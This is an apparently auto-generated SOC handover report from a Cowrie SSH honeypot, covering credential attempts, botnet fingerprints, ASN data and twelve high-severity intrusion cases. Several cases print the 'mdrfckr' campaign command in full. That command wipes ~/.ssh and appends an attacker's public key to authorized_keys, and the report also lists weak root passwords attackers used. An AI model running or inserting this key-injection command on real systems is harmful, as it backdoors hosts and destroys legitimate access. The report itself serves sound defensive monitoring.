# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-14 |
| **Generated At** | 2026-05-14T17:56:45Z |
| **Shift Time** | 17:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **124** |
| Confirmed Threats | **78** |
| False Positives Filtered | **46** (37.1%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **14** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **112** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **19** |
| Unique Credential Pairs | **9** |
| Unique Usernames | **3** |
| Unique Passwords | **9** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 6 |
| `linux` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `linux123` | 1 |
| `netserver` | 1 |
| `k0nig2019` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `linux` | `linux123` | 1 |
| `root` | `netserver` | 1 |
| `root` | `k0nig2019` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `netserver` | `36.95.194.51` | 2026-05-14T16:00:36 |
| `root` | `3245gs5662d34` | `36.95.194.51` | 2026-05-14T16:00:39 |
| `root` | `k0nig2019` | `36.95.194.51` | 2026-05-14T16:02:17 |
| `root` | `zm1314520` | `36.95.194.51` | 2026-05-14T16:03:50 |
| `root` | `shoutcast` | `103.59.94.124` | 2026-05-14T17:47:58 |
| `root` | `3245gs5662d34` | `103.59.94.124` | 2026-05-14T17:48:03 |
| `root` | `master22` | `177.70.165.8` | 2026-05-14T17:52:39 |
| `root` | `3245gs5662d34` | `177.70.165.8` | 2026-05-14T17:52:46 |
| `root` | `netscape` | `103.52.115.48` | 2026-05-14T17:52:58 |
| `root` | `3245gs5662d34` | `103.52.115.48` | 2026-05-14T17:53:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **124** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 23 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 20 | 5 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 20 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `36.95.194.51`, `177.70.165.8`, `103.59.94.124`, `103.52.115.48`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 2 | HIGH |
| `AS4788` | TM TECHNOLOGY SERVICES SDN. BHD. | 2 | LOW |
| `AS52228` | Cable Tica | 1 | HIGH |
| `AS21299` | Kar-Tel LLC | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS394684` | GOLD DATA USA INC | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ffea9bd89ad2

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-14 16:00 |
| **Last Seen** | 2026-05-14 16:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 16:00:36` | `cowrie.session.connect` |
| `2026-05-14 16:00:36` | `cowrie.client.version` |
| `2026-05-14 16:00:36` | `cowrie.client.kex` |
| `2026-05-14 16:00:36` | `cowrie.login.success` |
| `2026-05-14 16:00:36` | `cowrie.session.params` |
| `2026-05-14 16:00:36` | `cowrie.command.input` |
| `2026-05-14 16:00:36` | `cowrie.command.failed` |
| `2026-05-14 16:00:36` | `cowrie.log.closed` |
| `2026-05-14 16:00:37` | `cowrie.session.params` |
| `2026-05-14 16:00:37` | `cowrie.command.input` |
| `2026-05-14 16:00:37` | `cowrie.session.file_download` |
| `2026-05-14 16:00:37` | `cowrie.log.closed` |
| `2026-05-14 16:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60049e6d688c

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-14 16:00 |
| **Last Seen** | 2026-05-14 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 16:00:38` | `cowrie.session.connect` |
| `2026-05-14 16:00:38` | `cowrie.client.version` |
| `2026-05-14 16:00:38` | `cowrie.client.kex` |
| `2026-05-14 16:00:39` | `cowrie.login.success` |
| `2026-05-14 16:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f75ee3bc25

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-14 16:02 |
| **Last Seen** | 2026-05-14 16:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 16:02:17` | `cowrie.session.connect` |
| `2026-05-14 16:02:17` | `cowrie.client.version` |
| `2026-05-14 16:02:17` | `cowrie.client.kex` |
| `2026-05-14 16:02:17` | `cowrie.login.success` |
| `2026-05-14 16:02:17` | `cowrie.session.params` |
| `2026-05-14 16:02:17` | `cowrie.command.input` |
| `2026-05-14 16:02:17` | `cowrie.command.failed` |
| `2026-05-14 16:02:18` | `cowrie.log.closed` |
| `2026-05-14 16:02:18` | `cowrie.session.params` |
| `2026-05-14 16:02:18` | `cowrie.command.input` |
| `2026-05-14 16:02:18` | `cowrie.session.file_download` |
| `2026-05-14 16:02:18` | `cowrie.log.closed` |
| `2026-05-14 16:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15c9050e58cc

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-14 16:02 |
| **Last Seen** | 2026-05-14 16:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 16:02:20` | `cowrie.session.connect` |
| `2026-05-14 16:02:20` | `cowrie.client.version` |
| `2026-05-14 16:02:20` | `cowrie.client.kex` |
| `2026-05-14 16:02:20` | `cowrie.login.success` |
| `2026-05-14 16:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039eb1ea0777

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-14 16:03 |
| **Last Seen** | 2026-05-14 16:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 16:03:50` | `cowrie.session.connect` |
| `2026-05-14 16:03:50` | `cowrie.client.version` |
| `2026-05-14 16:03:50` | `cowrie.client.kex` |
| `2026-05-14 16:03:50` | `cowrie.login.success` |
| `2026-05-14 16:03:51` | `cowrie.session.params` |
| `2026-05-14 16:03:51` | `cowrie.command.input` |
| `2026-05-14 16:03:51` | `cowrie.command.failed` |
| `2026-05-14 16:03:51` | `cowrie.log.closed` |
| `2026-05-14 16:03:51` | `cowrie.session.params` |
| `2026-05-14 16:03:51` | `cowrie.command.input` |
| `2026-05-14 16:03:51` | `cowrie.session.file_download` |
| `2026-05-14 16:03:51` | `cowrie.log.closed` |
| `2026-05-14 16:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4699c82d6de

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-14 16:03 |
| **Last Seen** | 2026-05-14 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 16:03:53` | `cowrie.session.connect` |
| `2026-05-14 16:03:53` | `cowrie.client.version` |
| `2026-05-14 16:03:53` | `cowrie.client.kex` |
| `2026-05-14 16:03:53` | `cowrie.login.success` |
| `2026-05-14 16:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-068887a51e72

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]124` |
| **First Seen** | 2026-05-14 17:47 |
| **Last Seen** | 2026-05-14 17:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 17:47:57` | `cowrie.session.connect` |
| `2026-05-14 17:47:57` | `cowrie.client.version` |
| `2026-05-14 17:47:57` | `cowrie.client.kex` |
| `2026-05-14 17:47:58` | `cowrie.login.success` |
| `2026-05-14 17:47:58` | `cowrie.session.params` |
| `2026-05-14 17:47:58` | `cowrie.command.input` |
| `2026-05-14 17:47:58` | `cowrie.command.failed` |
| `2026-05-14 17:47:59` | `cowrie.log.closed` |
| `2026-05-14 17:47:59` | `cowrie.session.params` |
| `2026-05-14 17:47:59` | `cowrie.command.input` |
| `2026-05-14 17:47:59` | `cowrie.session.file_download` |
| `2026-05-14 17:47:59` | `cowrie.log.closed` |
| `2026-05-14 17:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03281b7fbc62

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]124` |
| **First Seen** | 2026-05-14 17:48 |
| **Last Seen** | 2026-05-14 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 17:48:02` | `cowrie.session.connect` |
| `2026-05-14 17:48:02` | `cowrie.client.version` |
| `2026-05-14 17:48:02` | `cowrie.client.kex` |
| `2026-05-14 17:48:03` | `cowrie.login.success` |
| `2026-05-14 17:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d45325df77

| Field | Detail |
|---|---|
| **Source IP** | `177.70.165[.]8` |
| **First Seen** | 2026-05-14 17:52 |
| **Last Seen** | 2026-05-14 17:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 17:52:37` | `cowrie.session.connect` |
| `2026-05-14 17:52:37` | `cowrie.client.version` |
| `2026-05-14 17:52:37` | `cowrie.client.kex` |
| `2026-05-14 17:52:39` | `cowrie.login.success` |
| `2026-05-14 17:52:39` | `cowrie.session.params` |
| `2026-05-14 17:52:39` | `cowrie.command.input` |
| `2026-05-14 17:52:39` | `cowrie.command.failed` |
| `2026-05-14 17:52:40` | `cowrie.log.closed` |
| `2026-05-14 17:52:40` | `cowrie.session.params` |
| `2026-05-14 17:52:40` | `cowrie.command.input` |
| `2026-05-14 17:52:41` | `cowrie.session.file_download` |
| `2026-05-14 17:52:41` | `cowrie.log.closed` |
| `2026-05-14 17:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.165[.]8` to AbuseIPDB if not already reported
- [ ] Block `177.70.165[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124a356a8bd2

| Field | Detail |
|---|---|
| **Source IP** | `177.70.165[.]8` |
| **First Seen** | 2026-05-14 17:52 |
| **Last Seen** | 2026-05-14 17:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 17:52:44` | `cowrie.session.connect` |
| `2026-05-14 17:52:44` | `cowrie.client.version` |
| `2026-05-14 17:52:45` | `cowrie.client.kex` |
| `2026-05-14 17:52:46` | `cowrie.login.success` |
| `2026-05-14 17:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.165[.]8` to AbuseIPDB if not already reported
- [ ] Block `177.70.165[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd523d26ecf

| Field | Detail |
|---|---|
| **Source IP** | `103.52.115[.]48` |
| **First Seen** | 2026-05-14 17:52 |
| **Last Seen** | 2026-05-14 17:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 17:52:57` | `cowrie.session.connect` |
| `2026-05-14 17:52:57` | `cowrie.client.version` |
| `2026-05-14 17:52:57` | `cowrie.client.kex` |
| `2026-05-14 17:52:58` | `cowrie.login.success` |
| `2026-05-14 17:52:59` | `cowrie.session.params` |
| `2026-05-14 17:52:59` | `cowrie.command.input` |
| `2026-05-14 17:52:59` | `cowrie.command.failed` |
| `2026-05-14 17:52:59` | `cowrie.log.closed` |
| `2026-05-14 17:52:59` | `cowrie.session.params` |
| `2026-05-14 17:52:59` | `cowrie.command.input` |
| `2026-05-14 17:52:59` | `cowrie.session.file_download` |
| `2026-05-14 17:52:59` | `cowrie.log.closed` |
| `2026-05-14 17:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.115[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.52.115[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc67d6c1bd7

| Field | Detail |
|---|---|
| **Source IP** | `103.52.115[.]48` |
| **First Seen** | 2026-05-14 17:53 |
| **Last Seen** | 2026-05-14 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 17:53:02` | `cowrie.session.connect` |
| `2026-05-14 17:53:02` | `cowrie.client.version` |
| `2026-05-14 17:53:02` | `cowrie.client.kex` |
| `2026-05-14 17:53:03` | `cowrie.login.success` |
| `2026-05-14 17:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.115[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.52.115[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `159.203.20[.]239` | **42** | 2026-05-14 14:30 | 2026-05-14 17:55 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `45.224.188[.]56` | **10** | 2026-05-14 17:34 | 2026-05-14 17:44 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `36.95.194[.]51` | **4** | 2026-05-14 15:54 | 2026-05-14 16:03 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.217[.]120` | **2** | 2026-05-14 16:47 | 2026-05-14 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.59.94[.]124` | 1 | 2026-05-14 17:47 | 2026-05-14 17:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.255.226[.]73` | 1 | 2026-05-14 17:28 | 2026-05-14 17:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `119.91.19[.]185` | 1 | 2026-05-14 17:52 | 2026-05-14 17:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.52.12[.]202` | 1 | 2026-05-14 15:58 | 2026-05-14 16:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.245.147[.]189` | 1 | 2026-05-14 17:50 | 2026-05-14 17:50 | 38s | 0 | `T1592` | 🟢 LOW |
| `179.50.206[.]78` | 1 | 2026-05-14 16:20 | 2026-05-14 16:20 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-05-14 15:56 | 2026-05-14 15:56 | 7s | 0 | `T1592` | 🟢 LOW |
| `49.163.139[.]48` | 1 | 2026-05-14 14:47 | 2026-05-14 14:47 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
